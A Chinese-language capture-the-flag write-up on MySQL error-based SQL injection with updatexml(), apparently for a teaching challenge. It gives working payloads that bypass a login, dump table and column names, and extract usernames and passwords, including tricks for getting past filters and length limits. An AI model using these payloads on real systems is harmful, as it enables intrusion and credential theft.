
### updatexml() 报错注入
![](https://pic1.imgdb.cn/item/6848e66a58cb8da5c842e442.jpg)

初次尝试万能密码登录成功，说明闭合为单引号

![](https://pic1.imgdb.cn/item/6848e79b58cb8da5c842f049.jpg)

`updatexml()` 用于更新 XML 数据，它接受 3 个参数

```sql
# xml_target：目标 XML 文本（必须是合法 XML 格式，否则报错）
# xpath_expr：XPath 表达式，用于选中 XML 中的节点
# new_value：要更新的新值
UPDATEXML(xml_target, xpath_expr, new_value)
```

在 MySQL 中使用 `updatexml()` 函数报错时，它通常会抛出一个 **XPATH 语法错误**，并将你传入的第二个参数（即 XPath 表达式）的一部分直接显示在错误信息中

第一、三个参数肯定会报错，所以我们将 `database()` 放在中间，这样就会执行显示出数据库名

可以再加上 `concat()` 函数将显示内容包裹起来，`0x7e` 即波浪号 `~`

```sql
1'or(updatexml(1,concat(0x7e,database(),0x7e),1))#
```

![](https://pic1.imgdb.cn/item/68495faa58cb8da5c8450122.jpg)

接下来就是爆表，这里注意 `=` 被过滤了使用 `like` 代替

```sql
1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))#
```

![](https://pic1.imgdb.cn/item/6849601f58cb8da5c84503d9.jpg)

接下来爆字段

```sql
1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))#
```

![](https://pic1.imgdb.cn/item/6849604658cb8da5c8450538.jpg)

查字段内容

```sql
1'or(updatexml(1,concat(0x7e,(select(group_concat(username,'~',password))from(H4rDsq1)),0x7e),1))#
```

![](https://pic1.imgdb.cn/item/6849608258cb8da5c845079a.jpg)

使用 `right()` 突破字符限制

```sql
1'or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))#
```

![](https://pic1.imgdb.cn/item/6849608e58cb8da5c8450840.jpg)
